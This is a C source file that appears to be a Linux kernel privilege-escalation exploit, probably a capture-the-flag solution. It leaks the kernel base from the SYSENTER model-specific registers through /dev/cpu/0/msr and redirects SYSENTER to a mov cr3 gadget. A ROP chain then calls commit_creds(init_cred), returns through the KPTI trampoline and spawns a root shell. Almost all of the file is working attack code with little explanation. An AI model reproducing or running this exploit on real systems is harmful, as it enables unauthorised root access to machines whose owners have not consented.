#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define MSR_IA32_SYSENTER_ESP           0x00000175
#define MSR_IA32_SYSENTER_EIP           0x00000176

int msrfd;

uint64_t read_msr(uint64_t msr) {
    uint64_t value;
    lseek(msrfd, msr, 0);
    read(msrfd, &value, 8);
    return value;
}

void write_msr(uint64_t msr, uint64_t value) {
    lseek(msrfd, msr, 0);
    write(msrfd, &value, 8);
}

void shell() {
    char* argv[] = { "/bin/sh", NULL };
    if (getuid() == 0) {
        printf("[+] Root privileges OK. Spawning root shell!\n");
    } else {
        printf("[-] Spawning a non-root shell...\n");
    }
    execv(argv[0], argv);
}

int main() {
    msrfd = open("/dev/cpu/0/msr", O_RDWR);
    if (msrfd < 0) {
        printf("Could not open msr file\n");
        return 1;
    }

    uint64_t sysenter_esp = read_msr(MSR_IA32_SYSENTER_ESP); // 0xfffffe7656323000
    uint64_t sysenter_eip = read_msr(MSR_IA32_SYSENTER_EIP); // 0xffffffffa1201bb0
    uint64_t kernel_base = sysenter_eip - 0x801bb0;

    printf("Sysenter ESP value: %llx\n", sysenter_esp);
    printf("Sysenter EIP value: %llx\n", sysenter_eip);
    printf("Kernel base: %llx\n", kernel_base);

    // Allocate some memory for a stack in userspace
    void* mmap_mem = mmap((void*)0x10000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memset(mmap_mem, 0x41, 0x10000);
    uint64_t rop_stack = (uint32_t) mmap_mem + 0x2000;
    uint64_t rop_stack2 = (uint32_t) mmap_mem + 0x4000;
    printf("ROP stack: %llx\n", rop_stack);
    printf("ROP stack 2: %llx\n", rop_stack2);
    
    // Only base + 0x800000 to base + 0xa00000 is mapped in user space due to KPTI
    // Use a mov cr3 gadget to swap to kernel page tables
    /*  
        0xffffffffa6e015c9 <swapgs_restore_regs_and_return_to_usermode+153>: mov    cr3,rdi
        0xffffffffa6e015cc <swapgs_restore_regs_and_return_to_usermode+156>: pop    rax
        0xffffffffa6e015cd <swapgs_restore_regs_and_return_to_usermode+157>: pop    rdi
        0xffffffffa6e015ce <swapgs_restore_regs_and_return_to_usermode+158>: swapgs
        0xffffffffa6e015d1 <swapgs_restore_regs_and_return_to_usermode+161>: jmp    0xffffffffa6e015fa <restore_regs_and_return_to_kernel+39>
        0xffffffffa6e015fa <restore_regs_and_return_to_kernel+39>:   test   BYTE PTR [rsp+0x20],0x4
        0xffffffffa6e015ff <restore_regs_and_return_to_kernel+44>:   jne    0xffffffffa6e01603 <native_irq_return_ldt>
        0xffffffffa6e01601 <native_irq_return_iret>: iretq 
    */

    // Set sysenter entry to mov cr3, rdi gadget
    uint64_t mov_cr3 = kernel_base + 0x8015c9;
    write_msr(MSR_IA32_SYSENTER_EIP, mov_cr3);

    // Set sysenter stack address to the stack which will contain the ROP chain
    write_msr(MSR_IA32_SYSENTER_ESP, rop_stack);

    // Ropchain: pop rax, pop rdi, iretq -> commit_creds(init_cred)
    uint64_t* rop = (uint64_t*)rop_stack;
    *rop++ = 0; // rax
    *rop++ = kernel_base + 0xe44860;// rdi (init_cred)
    *rop++ = kernel_base + 0x8b020; // rip (commit_creds)
    *rop++ = 0x10; // cs
    *rop++ = 0x40046; // eflags
    *rop++ = rop_stack2; // sp (next rop stack)
    *rop++ = 0x18; // ss

    // Ropchain 2: return to userland with kpti trampoline
    rop = (uint64_t*)rop_stack2;
    *rop++ = kernel_base + 0x80158b; // swapgs_restore_regs_and_return_to_usermode (skipping until mov rdi, cr3)
    *rop++ = 0; // rax
    *rop++ = 0; // rdi
    *rop++ = (uint64_t)shell;
    *rop++ = 0x23; // cs
    *rop++ = 0x40046; // eflags
    *rop++ = rop_stack; // sp
    *rop++ = 0x2b; // ss

    // Disable SMAP
    asm(""" mov $0x40000, %eax;\
            push %eax;\
            popf;""");

    // Start ROP (will ROP in 64 bits mode)
    // /!\ EDI contains a random possible value for kernel page tables CR3... We have to get lucky here
    // Could just ROP to leak CR3 first...
    asm(""" mov $0x18b6000, %edi;\
            sysenter");

    return 0;
}